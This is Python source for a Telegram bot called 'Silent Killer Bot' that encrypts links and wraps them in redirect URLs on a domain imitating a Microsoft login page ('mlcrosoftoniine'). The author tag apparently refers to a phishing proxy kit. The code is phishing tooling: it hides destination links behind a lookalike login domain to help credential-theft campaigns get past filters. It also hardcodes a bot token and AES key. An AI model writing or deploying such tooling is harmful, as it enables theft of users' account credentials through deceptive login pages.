import base64
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ConversationHandler, ContextTypes
)
from urllib.parse import quote_plus
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# === CONFIG ===
BOT_TOKEN = "8147465925:AAFkKvyFTOcpP0iADv8NplNStrdBlLUmd_U"
AUTHORIZED_USER_ID = 7819545501
AES_KEY = b'ThisIsA32ByteLongSecretKey123456'
REDIRECT_DOMAIN = "https://login.id.mlcrosoftoniine.vhmxdrd.co"
AUTHOR = "@kkrasta_ginx"
WAITING_FOR_LINK = 1
# ==============

def encrypt_link(link: str) -> str:
    iv = get_random_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(link.encode('utf-8'), AES.block_size))
    encrypted = base64.urlsafe_b64encode(iv + ciphertext).decode('utf-8')
    return f"{REDIRECT_DOMAIN}/r?l={quote_plus(encrypted)}"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🔐 Encrypt Link for Redirect", callback_data="encrypt")]]
    markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"💀 *Silent Killer Bot by {AUTHOR}*\n\n"
        f"Redirect domain:\n🔗 {REDIRECT_DOMAIN}",
        reply_markup=markup,
        parse_mode="Markdown"
    )

async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text("📝 Enter the link you want to encrypt for redirect:")
    return WAITING_FOR_LINK

async def receive_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        await update.message.reply_text("🚫 Access denied.")
        return ConversationHandler.END

    link = update.message.text.strip()
    try:
        encrypted_url = encrypt_link(link)
        await update.message.reply_text(f"✅ Redirect URL:\n{encrypted_url}\n\n— {AUTHOR}")
    except Exception as e:
        await update.message.reply_text(f"❌ Encryption failed: {str(e)}")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle_button)],
        states={WAITING_FOR_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_link)]},
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == "__main__":
    main()